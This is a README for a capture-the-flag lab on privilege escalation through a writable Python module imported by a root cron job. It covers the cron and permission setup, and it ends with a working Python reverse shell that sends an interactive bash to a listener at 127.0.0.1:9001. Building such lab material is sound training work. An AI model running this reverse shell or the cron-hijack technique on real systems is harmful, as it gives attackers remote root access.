# EncryptEdge RCSCTF

This repository contains details and code for the EncryptEdge RCSCTF Challenge No.3 Privilage Escalation part.

## Table of Contents
- [Introduction](#introduction)
- [Installation](#installation)
- [Usage](#usage)

## Introduction
This particular challenge is designed to showcase various Python libraries and demonstrate system administration tasks such as creating cron jobs and managing file permissions.

This challenge is based on the "Write Permissions on Imported Python Module"

# Installation
> To get started with the challenge, follow these steps:

1. Clone the repository:
    ```shell
    git clone https://github.com/your-username/EncryptEdge-RCSCTF.git
    ```

2. Install the required Python libraries:
    ```
    pip install -r requirements.txt
    ```

# Usage

## Checking Default Python Libraries
> To check the default Python libraries, run the following command:
```
python3 -c 'import sys; print("\n".join(sys.path))'
```

## Create a System-wide Cronjob
> To create a system-wide cronjob that runs every 2 minutes, edit the /etc/crontab file:

```
sudo nano /etc/crontab
```

> Add the following line to run the Python script every 2 minutes:
```
*/2 * * * * /usr/bin/python3 /home/xavir/Fishy.py
```

## Manage Access to Fishy.py
> To give only read access to Fishy.py to the user xavir, use the chmod and chown commands:

```
chown root:xavir /path/to/Fishy.py
chmod 640 /path/to/Fishy.py
```

## View System-wide Cronjob
> To view the system-wide cronjob, use the following command:

```
cat /etc/crontab
```

## Implementing a Reverse Shell in Python
```
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9001))
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
run(["/bin/bash", "-i"])
```
